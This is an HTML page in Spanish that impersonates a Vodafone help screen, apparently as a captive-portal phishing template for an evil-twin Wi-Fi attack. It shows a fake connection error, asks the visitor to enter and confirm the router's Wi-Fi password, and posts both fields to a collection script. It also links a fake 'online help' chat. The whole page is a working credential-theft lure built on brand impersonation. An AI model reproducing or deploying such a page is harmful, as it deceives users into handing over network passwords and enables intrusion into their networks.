<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<link rel="stylesheet" href="/msftconnecttest/vodacss/style.css" media="screen" type="text/css" />




	<title>Ayuda Vodafone</title>
</head>
<body>
<img class="idayuda" src="/msftconnecttest/vodaimg/ayudavodafone.png"/>
</br>
</br>
<p>Error 109: no se puede conectar a la red, para segurar la conexión hay que entrar la contraseña wifi del router.La contraseña esta indicado atrás del router.</p>
</br>
</br>
</br>
<img class="idvoda2" src="/msftconnecttest/vodaimg/vodaclavewifi.jpg"/>
</br>
<div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="vodavalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='ENTRAR' >

            </form>
        </div>
</br>
<a href="/msftconnecttest/shout/vodatchat.php" target="_blank"><u>Ayuda en linea</u>?</a>

</br>
<img class="idvodabasdepage" src="/msftconnecttest/vodaimg/vodafonepicture2.png"/>
</body>
</html>




